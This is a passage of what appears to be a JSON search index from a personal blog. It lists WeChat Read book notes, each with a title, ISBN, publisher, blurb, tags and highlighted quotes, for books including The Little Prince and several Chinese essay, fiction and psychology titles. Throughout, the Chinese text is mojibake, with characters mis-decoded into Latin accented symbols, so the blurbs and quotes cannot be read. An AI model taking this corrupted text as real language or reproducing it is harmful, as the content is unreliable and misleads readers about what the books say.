ç”¨ï¼Œé‚£æ°æ°æ˜¯ä¸€ä¸ªäººç²¾ç¥ç”Ÿé•¿çš„é¢†åŸŸã€‚ â€” åˆ›å»ºäº [[2022-04-09]] 21:53 ^94-1070-1194 æ„‰å¿«æ˜¯åŸºæœ¬æ ‡å‡† æ„‰å¿«æ˜¯åŸºæœ¬æ ‡å‡† æ„‰å¿«æ˜¯åŸºæœ¬æ ‡å‡†ã€‚ â€” åˆ›å»ºäº [[2022-04-09]] 21:53 ^105-412-420 å†…åœ¨ç”Ÿæ´» å†…åœ¨ç”Ÿæ´» ä¸–ä¸Šæœ‰ä¸€æ ·ä¸œè¥¿ï¼Œæ¯”ä»»ä½•åˆ«çš„ä¸œè¥¿éƒ½æ›´å¿ è¯šäºä½ ï¼Œé‚£å°±æ˜¯ä½ çš„ç»å†ã€‚ä½ ç”Ÿå‘½ä¸­çš„æ—¥å­ï¼Œä½ åœ¨å…¶ä¸­é­é‡çš„äººå’Œäº‹ï¼Œä½ å› è¿™äº›é­é‡äº§ç”Ÿçš„æ‚²æ¬¢ã€æ„Ÿå—å’Œæ€è€ƒï¼Œè¿™ä¸€åˆ‡ä»…ä»…å±äºä½ ï¼Œä¸å¯èƒ½è½¬è®©ç»™ä»»ä½•åˆ«äººï¼Œå“ªæ€•æ˜¯ä½ æœ€äº²è¿‘çš„äººã€‚ â€” åˆ›å»ºäº [[2022-05-11]] 15:10 ^108-1040-1137 äººç”Ÿå¯“è¨€ ç”Ÿå‘½å®³æ€•å•è°ƒç”šäºå®³æ€•æ­»äº¡ â€” åˆ›å»ºäº [[2022-04-09]] 21:49 ^291189470-7yoAprUTE æ„ŸåŒèº«å—å‘€","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"å°ç‹å­","date":"2024-08-31T01:35:29.291Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/å°ç‹å­-ã€æ³•ã€‘åœ£åŸƒå…‹è‹ä½©é‡Œ/","text":"ä½œè€…ï¼šã€æ³•ã€‘åœ£åŸƒå…‹è‹ä½©é‡Œ - å†…å®¹ç®€ä»‹ ã€Šå°ç‹å­ã€‹ 1944å¹´7æœˆ31æ—¥ï¼Œé…·çˆ±é£è¡Œä¸æ­£ä¹‰çš„åœ£åŸƒå…‹è‹ä½©é‡Œé©¾ç€ä»–çš„é£æœºæ°¸è¿œç¦»å¼€äº†æˆ‘ä»¬ï¼Œå°±åƒä»–ç¬”ä¸‹çš„å°ç‹å­ï¼Œä»–çš„ç¦»å¼€ç»™æˆ‘ä»¬ç•™ä¸‹çš„æ˜¯æ— é™çš„é—æ†¾ä¸æ€€å¿µã€‚2004å¹´ï¼Œæ³•å›½å…¬å¼€äº†63å¹…æå…¶çè´µçš„ã€Šå°ç‹å­ã€‹ä½œè€…åŸæ‰‹ç¨¿æ’ç”»ï¼Œè¿™äº›æ’ç”»ä»ä¸–ç•Œå„åœ°åå¤šä¸ªå›½å®¶æ”¶é›†è€Œæ¥ï¼ŒçœŸå®åœ°å±•ç°äº†ã€Šå°ç‹å­ã€‹æ•´ä¸ªçš„åˆ›ä½œè¿‡ç¨‹ã€‚æ±‡é›†è¿™äº›å›¾ç‰‡çš„ä¹¦ä¸€ç»å‡ºç‰ˆï¼Œç«‹åˆ»æˆä¸ºå…¨çƒå°ç‹å­è¿·äº‰ç›¸è´­ä¹°çš„çè—å“ã€‚ å°ç‹å­ + ã€Šå°ç‹å­ã€‹ å±æ€§ å†…å®¹ ISBN 9787538730586 ä½œè€… ã€æ³•ã€‘åœ£åŸƒå…‹è‹ä½©é‡Œ å‡ºç‰ˆå¹´ 2010-07-01 å‡ºç‰ˆç¤¾ æ—¶ä»£æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº å°ç‹å­ åˆ†ç±» æ–‡å­¦-ä¸–ç•Œåè‘— é«˜äº®åˆ’çº¿ ç¼–è€…åº æœªæ›¾å°˜å°çš„çˆ±ä¸è´£ä»» ç¼–è€…åº æœªæ›¾å°˜å°çš„çˆ±ä¸è´£ä»» å¹´è½»çš„æ—¶å€™å¦‚æœä¸å¥½å¥½å»çˆ±ï¼Œç­‰åˆ°è€å»çš„æ—¶å€™å°±ä¸€å®šä¼šå› ä¸ºæ›¾ç»çš„è½»ç‹‚è€Œæ„Ÿåˆ°åæ‚”ã€‚å‡å¦‚å°ç‹å­çŸ¥é“å¦‚ä½•å»çˆ±ï¼Œä¹Ÿè®¸ä»–å°±ä¸éœ€è¦æœ€åç”¨ç”Ÿå‘½å»å®è·µçˆ±ã€‚å‡å¦‚åœ£åŸƒå…‹è‹ä½©é‡Œå’Œåº·è‹ç½—çŸ¥é“å¦‚ä½•å»çˆ±ï¼Œé‚£ä¹ˆä»–ä»¬çš„å©šå§»ç”Ÿæ´»ä¹Ÿè®¸ä¸€ç›´ä¼šåƒåœ¨å°¼æ–¯çš„æ—¶å…‰ä¸€æ ·ï¼Œæƒ¬æ„è€Œä¸”æ‚ é—²ã€‚å‡å¦‚æˆ‘ä»¬éƒ½æ‡‚å¾—å¦‚ä½•å»çˆ±ï¼Œé‚£ä¹ˆé‚£äº›æƒ…æ­Œé‡Œå“€å©‰çš„æ—‹å¾‹å°±ä¼šå°‘äº†è®¸å¤šæ‚²æˆšã€‚ â€” åˆ›å»ºäº [[2022-08-11]] 18:26 ^6-1208-1357 6 6 ä½ çŸ¥é“â€¦â€¦äººå¿§ä¼¤æ—¶ï¼Œéƒ½å–œæ¬¢æ—¥è½çš„â€¦â€¦â€ â€” åˆ›å»ºäº [[2022-08-11]] 23:43 ^13-1151-1170 7 7 â€œæ­£ç»äº‹ï¼â€ ä»–çœ‹çœ‹æˆ‘ï¼Œæˆ‘æ‰‹æ‹¿æ¦”å¤´ï¼Œæ‰‹æŒ‡æ»¡æ˜¯æ²¹æ±¡ï¼Œè¶´åœ¨ä¸€ä¸ªä»–è®¤ä¸ºå¥‡ä¸‘çš„ä¸œè¥¿ä¸Šã€‚ â€œä½ è¯´è¯å°±åƒé‚£äº›å¤§äººï¼â€ è¿™è¯æˆ‘å¬äº†æœ‰ç‚¹ä¸å¥½æ„æ€ã€‚å¯æ˜¯ä»–ä¸ä¾ä¸é¥¶ï¼Œåˆè¯´é“ï¼š â€” åˆ›å»ºäº [[2022-08-11]] 23:24 ^14-1323 7 è‹¥æœ‰äººçˆ±ä¸Šäº†å¼€åœ¨äº¿ä¸‡æ˜Ÿæ˜Ÿä¸Šçš„ä¸€æ ªèŠ±ï¼Œé‚£ä¹ˆçœ‹ç€æ˜Ÿæ˜Ÿå°±è¶³ä»¥ä½¿ä»–æ„Ÿåˆ°å¹¸ç¦ã€‚ä»–å¯¹è‡ªå·±è¯´ï¼šâ€˜æˆ‘çš„é‚£æœµèŠ±å°±åœ¨å…¶ä¸­æŸå¤„â€¦â€¦â€™ä½†æ˜¯ç¾Šè‹¥åƒæ‰äº†èŠ±ï¼Œå¯¹ä»–æ¥è¯´ï¼Œä»¿ä½›æ‰€æœ‰çš„æ˜Ÿæ˜Ÿä¸€ä¸‹å­å…¨éƒ½æ¶ˆå¤±äº†ï¼è¿™éš¾é“ä¹Ÿä¸é‡è¦å—ï¼ â€” åˆ›å»ºäº [[2022-08-12]] 19:19 ^14-2072-2166 7 æˆ‘ä¹Ÿä¸å¤§çŸ¥é“è¯¥è¯´äº›ä»€ä¹ˆã€‚æˆ‘æ„Ÿåˆ°è‡ªå·±çš„å˜´å¤ªæ‹™ã€‚æˆ‘ä¸çŸ¥é“æ€ä¹ˆè¿åˆä»–çš„å¿ƒæ€ï¼Œæ€ä¹ˆè·Ÿä»–èµ°å¾—æ›´è¿‘äº›ã€‚æ³ªæ°´çš„å›½åº¦æ˜¯å¤šä¹ˆçš„ç¥ç§˜å•Šï¼ â€” åˆ›å»ºäº [[2022-08-12]] 19:22 ^14-2334-2392 æœ¬ä¹¦ç®€ä»‹ æœ¬ä¹¦ç®€ä»‹ å°±åƒå°ç‹å­ä¸€æ ·ï¼Œæˆ‘ä»¬æ›¾ç»ã€æˆ–å°†è¦ç»å†ä¸€é¢—åˆä¸€é¢—çš„è¡Œæ˜Ÿï¼Œæ¥è§¦å„å¼å„æ ·çš„äººã€‚æˆ‘ä»¬å­¦ä¹ ã€æ€è€ƒã€æ”¹å˜ã€æˆé•¿ï¼Œå²æœˆå¸¦èµ°äº†å¤ªå¤šçš„è®°å¿†ï¼Œä¹Ÿæ¶ˆèš€äº†æˆ‘ä»¬å¿ƒåº•æ›¾ç»çš„èµ¤å­ä¹‹å¿ƒï¼Œæ²¡æœ‰äººæ°¸è¿œç«¥å¹´ï¼Œå¯æˆ‘ä»¬å¯¹ç«¥å¹´çš„æ¸´æœ›æ˜¯æ°¸è¿œçš„ã€‚åœ¨è¿™ä¸ªç‰¹æ®Šçš„æ—¶åˆ»ï¼Œæˆ‘ä»¬æƒ³å¤§å£°çš„å‘Šè¯‰åœ£åŸƒå…‹è‹ä½©é‡Œï¼šæˆ‘ä»¬å–œæ¬¢ä¸‹ç‹å­ï¼Œå–œæ¬¢ä»–çš„å¯çˆ±ã€å–œæ¬¢ä»–çš„å¿§éƒã€å–œæ¬¢ä»–çš„çº¯çœŸã€å–œæ¬¢ä»–çš„è´£ä»»ã€å–œæ¬¢ä»–çš„ä½“è´´ã€‚æ„Ÿè°¢ä½ ä¸ºæˆ‘ä»¬çš„ç”Ÿå‘½ä¸­å¸¦æ¥äº†ã€Šå°ç‹å­ã€‹ï¼Œæ„Ÿè°¢ä½ ä¸ºæˆ‘ä»¬ä¿å­˜äº†é‚£æ— æ¯”çè´µçš„ç«¥çœŸã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 07:43 ^94-426-660","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"äººé—´å‘Šç™½","date":"2024-08-31T01:35:29.288Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/äººé—´å‘Šç™½-é‡‘é±¼é…±/","text":"ä½œè€…ï¼šé‡‘é±¼é…± - å†…å®¹ç®€ä»‹ ã€Šäººé—´å‘Šç™½ã€‹ â€œå“ªæ€•åªæœ‰ä¸€å¤©ï¼Œæˆ‘ä¹Ÿè¦æ¨ç€è½®æ¤…ä¸Šçš„å°å¿½å»æµ·è¾¹çœ‹ä¸€æ¬¡æ—¥å‡ºï¼Œé™ªå°å¿½åƒä¸€é¡¿åˆé¤ï¼Œä¹Ÿè¦å¸¦èŠ±ç”Ÿæ¥æŠ±ä¸€æŠ±å°å¿½â€¦â€¦å“ªæ€•åªæœ‰ä¸€å¤©ï¼Œæˆ‘ä¹Ÿè¦åˆ›é€ æœºä¼šï¼Œå’Œä»–å¤šç•™ä¸‹ä¸€ç‚¹ç¾å¥½çš„å›å¿†ã€‚å¦‚æ­¤ï¼Œæ¯å¤šå‡ºæ¥çš„ä¸€å¤©ï¼Œå°±æ˜¯æˆ‘ä»¬èµšåˆ°çš„å¹¸ç¦ã€‚è¿™æ ·æƒ³æƒ³ï¼Œç”Ÿæ´»åˆå……æ»¡æœŸå¾…å’Œå¿µæƒ³äº†ã€‚â€å°å¿½æ­£å½“å£®å¹´ç½¹æ‚£ç™Œç—‡ï¼Œç•™ä¸‹å„¿å­èŠ±ç”Ÿå’Œå¦»å­é‡‘é±¼é…±ç‹¬è‡ªè¡Œèµ°åœ¨äººé—´ã€‚é‡‘é±¼é…±ä¸€ç¬”ä¸€åˆ’è®°å½•ä¸‹æŠ—ç™Œè·¯ä¸Šçš„çœŸå®æ•…äº‹ï¼Œæ¸©æš–è€Œåˆºç—›ï¼Œç»æœ›åˆåšå¼ºã€‚ç­‰èŠ±ç”Ÿé•¿å¤§ï¼Œå°±æ‹¿ç»™ä»–çœ‹ã€‚ äººé—´å‘Šç™½ + ã€Šäººé—´å‘Šç™½ã€‹ å±æ€§ å†…å®¹ ISBN 9787550035652 ä½œè€… é‡‘é±¼é…± å‡ºç‰ˆå¹´ 2020-03-01 å‡ºç‰ˆç¤¾ ç™¾èŠ±æ´²æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº äººé—´å‘Šç™½ åˆ†ç±» æ–‡å­¦-æ•£æ–‡æ‚è‘— é«˜äº®åˆ’çº¿ è‡´è°¢ è‡´è°¢ ä¸Šè‹ç»™äº†æ¯ä¸ªäººä¸€ç“¶æ—¶é—´çš„æ²™æ¼ï¼Œå±äºæˆ‘ä»¬çš„é‚£ç“¶æ²™æ¼ï¼Œä¸Šæ–¹çš„æ²™ç²’å·²ç»æ‰€å‰©æ— å‡ ã€‚å³ä½¿å¦‚æ­¤ï¼Œæˆ‘ä»¬ä»ç„¶ç”¨å°½å…¨åŠ›ï¼Œè®¤çœŸç”Ÿæ´»ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 22:36 ^55-648-704 æ’å›¾ æ’å›¾ æˆ‘å¼€å§‹å–œæ¬¢ç»™ä½ å†™ä¿¡ï¼Œä¸€å°ä¸€å°ï¼Œå†™æ»¡äº†æˆ‘å¯¹ä½ çš„æ€å¿µã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 22:37 ^56-3258-3283","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"ä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬","date":"2024-08-31T01:35:29.285Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/ä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬-ç¨‹ä¸€/","text":"ä½œè€…ï¼šç¨‹ä¸€ - å†…å®¹ç®€ä»‹ ã€Šä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬ã€‹ ç¨‹ä¸€2020å…¨æ–°ä½³ä½œï¼Œ14ä¸ªæ‚²æ¬¢ç¦»åˆçš„æ•…äº‹ï¼Œæœ‰äº²æƒ…ï¼Œæœ‰çˆ±æƒ…ï¼Œæœ‰å‹æƒ…ï¼Œä¸ºäº†è¿™æœ¬ä¹¦ï¼Œç¨‹ä¸€å‡†å¤‡äº†5å¹´ï¼Œå¯¹è¯äº†3000ä¸‡çš„å¬ä¼—ã€‚æ¯æ™šçš„é™ªä¼´ï¼Œç¨‹ä¸€è®¤çœŸè®°ä¸‹æ¯ä¸€ä¸ªå¬ä¼—æ‰€è®²çš„å¿ƒäº‹ï¼Œè¿™äº›å¿ƒäº‹æµ“ç¼©æˆè¿™æœ¬ä¹¦ï¼Œè½»æ˜“è§¦åŠ¨æˆ‘ä»¬å¿ƒåº•çš„æŸ”è½¯ã€‚è®°å¿†ä¼šè¡°é€€ï¼Œæ—¶å…‰ä¼šæµé€ï¼Œè¿™æœ¬ä¹¦ä¼šè®°ä¸‹æˆ‘ä»¬ä¹‹é—´æ‰€æœ‰çš„ç¼˜åˆ†ã€‚è¿™æ˜¯å¾ˆé•¿ï¼Œå¾ˆå¥½çš„ä¸€ç”Ÿã€‚æˆ‘ä»¬æ— æ³•é¢„çŸ¥æ˜å¤©ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ€€å¿µæ˜¨å¤©ï¼Œå¹¶æŠŠä»Šå¤©è¿‡å¥½ã€‚ ä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬ + ã€Šä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬ã€‹ å±æ€§ å†…å®¹ ISBN 9787514383232 ä½œè€… ç¨‹ä¸€ å‡ºç‰ˆå¹´ 2020-06-01 å‡ºç‰ˆç¤¾ ç°ä»£å‡ºç‰ˆç¤¾ æ¥æº ä¸è´Ÿè¿‡å¾€ï¼Œä¸æƒ§å­¤ç‹¬ åˆ†ç±» æ–‡å­¦-æ•£æ–‡æ‚è‘— é«˜äº®åˆ’çº¿ å·é¦– å·é¦– éƒ½è¯´ï¼Œäººä¸€è¾ˆå­ è‡³å°‘ä¼šçˆ±ä¸¤ä¸ªäººã€‚ ä¸€ä¸ªç‚½çƒ­æ²¡ç»“æœï¼Œ ä¸€ä¸ªå¹³æ·¡åˆ°æ°¸ä¹…ã€‚ å‰ä¸€ä¸ªæ•™ä¼šä½ ä»€ä¹ˆæ˜¯çˆ±ï¼Œ åä¸€ä¸ªå‘Šè¯‰ä½ æ€ä¹ˆå»çˆ±ã€‚ äººç”Ÿå¤„å¤„éƒ½æ˜¯é€‰æ‹©ï¼Œ ä¼Ÿå¤§æ˜¯ï¼Œ å¹³å‡¡ä¹Ÿæ˜¯ã€‚ æ­»äº†éƒ½è¦çˆ±æ˜¯çˆ±æƒ…ï¼Œ ç»†æ°´é•¿æµä¹Ÿæ˜¯çˆ±æƒ…ã€‚ æˆ‘ä»¬ç»ˆå°†å½’äºå¹³åº¸ï¼Œ é‡è¦çš„æ˜¯ï¼Œ ä¼šå’Œè°ä¸€èµ·å½’äºå¹³åº¸ã€‚ â€” åˆ›å»ºäº [[2023-05-02]] 22:53 ^3-1797-2287 åº ä¸ºäº†å†™è¿™æœ¬ä¹¦ï¼Œæˆ‘å¯¹è¯äº†ä¸‰åƒä¸‡å¬ä¼—ã€‚ åº ä¸ºäº†å†™è¿™æœ¬ä¹¦ï¼Œæˆ‘å¯¹è¯äº†ä¸‰åƒä¸‡å¬ä¼—ã€‚ ä»–æ—¥ç›¸é€¢ï¼Œæˆ‘ä»¬åªè°ˆæ¬£å–œï¼Œä¸è®²æ‚²ä¼¤ã€‚æ„¿ä½ ä»¬ä¸€åˆ‡éƒ½å¥½ï¼Œå²å²å¹³å®‰ï¼è€Œæˆ‘ä¹Ÿæ˜¯ã€‚ â€” åˆ›å»ºäº [[2023-05-03]] 15:00 ^4-2874-2909","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"ä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰","date":"2024-08-31T01:35:29.277Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/ä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰-åˆ˜éœ‡äº‘/","text":"ä½œè€…ï¼šåˆ˜éœ‡äº‘ - å†…å®¹ç®€ä»‹ ã€Šä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰ã€‹ æœ¬ä¹¦æ˜¯è‘—åä½œå®¶åˆ˜éœ‡äº‘å…ˆç”Ÿå‚ç£¨å››å¹´çš„æ‰›é¼ä¹‹ä½œã€‚è¢«åŒ—äº¬äº”å¤§è¯„è®ºå®¶èª‰ä¸ºâ€œä¸­å›½çš„ã€Šç™¾å¹´å­¤ç‹¬ã€‹ï¼ˆè¯ºè´å°”è·å¥–ä½œå®¶é©¬å°”å…‹æ–¯çš„ä½œå“ï¼‰â€ï¼Œæ˜¯åˆ˜éœ‡äº‘è¿„ä»Šä¸ºæ­¢æœ€æˆç†Ÿæœ€å¤§æ°”çš„ä½œå“ã€‚è¿™éƒ¨å°è¯´æ´—å°½é“…åï¼Œè¿”ç’å½’çœŸï¼Œç¬”è§¦å§‹ç»ˆç´§è´´è‹¦éš¾çš„å¤§åœ°å’Œè´±å¦‚è‰èŠ¥çš„åº•å±‚äººç¾¤ï¼Œç»“æ„å•çº¯è€Œå†…å®¹ä¸°å¯Œï¼Œå‘½æ‚¬ä¸€ä¸è€Œè¡æ°”å›è‚ ï¼Œä¸»äººå…¬å¸¸å¸¸èµ°æŠ•æ— è·¯è€Œåˆä¸€ç›´å‹‡å¾€ç›´å‰ã€‚è¿™æ˜¯å½“ä»£æ–‡å›æ•¢äºç›´é¢çœŸå®çš„ä¸å¯å¤šå¾—çš„ä½³ä½œã€‚è‘—åè¯„è®ºå®¶å¼ é¢æ­¦è¯´ï¼Œè¯¥ä¹¦æ˜¯åˆ˜éœ‡äº‘â€œæœ€å…·ä¼å›¾å¿ƒå’Œæƒ³è±¡åŠ›çš„ä½œå“ï¼Œä¹Ÿæ˜¯ä»–è¶…è¶Šè‡ªæˆ‘çš„æœ€ä¸ºåšéŸ§çš„åŠªåŠ›çš„æˆæœã€‚â€æˆ‘ä»¬è®¤ä¸ºè¯¥ä¹¦æ˜¯åˆ˜éœ‡äº‘ä½œå“ä¸­å”¯ä¸€å¯ä»¥è·å¥–ä¹Ÿå¯ä»¥ç•™å­˜æ–‡å­¦å²çš„ç•…é”€å’Œé•¿é”€çš„ä½œå“ã€‚ ä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰ + ã€Šä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9787535486752 ä½œè€… åˆ˜éœ‡äº‘ å‡ºç‰ˆå¹´ 2016-08-01 å‡ºç‰ˆç¤¾ é•¿æ±Ÿæ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº ä¸€å¥é¡¶ä¸€ä¸‡å¥ï¼ˆå…¸è—ç‰ˆï¼‰ åˆ†ç±» æ–‡å­¦-ç»å…¸ä½œå“ é«˜äº®åˆ’çº¿ ä¸€ ä¸€ å¯ä»–ä¸€å–å¤šï¼Œå°±æ‹‰ç€æˆ‘æå¿ƒçªå­ï¼Œä»–æå®Œç—›å¿«äº†ï¼Œæˆ‘çªå¿ƒäº†ã€‚ â€” åˆ›å»ºäº [[2021-11-25]] 17:08 ^33-2655-2682","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"é«˜åº¦æ•æ„Ÿçš„åŠ›é‡","date":"2024-08-31T01:35:29.264Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/é«˜åº¦æ•æ„Ÿçš„åŠ›é‡-å¡ç‰¹ç³Â·ä½æ–¯ç‰¹/","text":"ä½œè€…ï¼šå¡ç‰¹ç³Â·ä½æ–¯ç‰¹ - å†…å®¹ç®€ä»‹ ã€Šé«˜åº¦æ•æ„Ÿçš„åŠ›é‡ã€‹ ä½ åœ¨ç†™ç†™æ”˜æ”˜çš„å¤§å•†åœºé‡Œæ€»è§‰å¾—çƒ¦é—·ï¼Œå¯åˆ«äººå´æœ‰è¯´æœ‰ç¬‘ï¼Ÿä½ èƒ½é—»å‡ºé¥­èœä¸å¯å£çš„æ°”å‘³ï¼Œå¯åˆ«äººå´è¯´ä½ å˜´å¤ªåˆï¼Ÿä½ èƒ½åˆ©ç”¨ç›´è§‰è¯†ç ´è°è¨€ï¼Œå¯åˆ«äººå´è¯´ä½ ç–‘å¿ƒå¤ªé‡ï¼Ÿé«˜åº¦æ•æ„Ÿç ”ç©¶é¢†åŸŸçš„å…ˆé©±ä¼Šè±æ©Â·N.é˜¿ä¼¦å‘ç°ï¼Œçº¦15%~20%çš„äººå±äºé«˜åº¦æ•æ„Ÿè€…ï¼Œä»–ä»¬å¤©ç”Ÿæ‹¥æœ‰ä¸€ç§ç‰¹æ®Šçš„ç¥ç»ç³»ç»Ÿï¼Œèƒ½æ¯”å…¶ä»–äººæ›´æ·±å…¥è€Œæ•é”åœ°æ„ŸçŸ¥å¹¶å¤„ç†å†…å¤–åˆºæ¿€ã€‚å› æ­¤ï¼Œä»–ä»¬ä¹Ÿå¸¸å¸¸è¢«è´´ä¸Šâ€œç»ç’ƒå¿ƒâ€â€œçŸ«æƒ…â€â€œè„†å¼±â€ç­‰æ ‡ç­¾ã€‚ä½œä¸ºä¸€åé«˜åº¦æ•æ„Ÿè€…ï¼Œæœ¬ä¹¦çš„ä½œè€…å¡ç‰¹ç³Â·ä½æ–¯ç‰¹ç°èº«è¯´æ³•ï¼Œæ”¶é›†äº†åŒ…å«æ„Ÿå®˜ã€å¥åº·ã€å·¥ä½œã€å®¶åº­ã€å¨±ä¹ç­‰å¤šä¸ªä¸»é¢˜çš„ä¸°å¯Œæ¡ˆä¾‹ï¼Œé¼“åŠ±é«˜åº¦æ•æ„Ÿè€…æŠ›å¼ƒä¸–ä¿—çš„æ 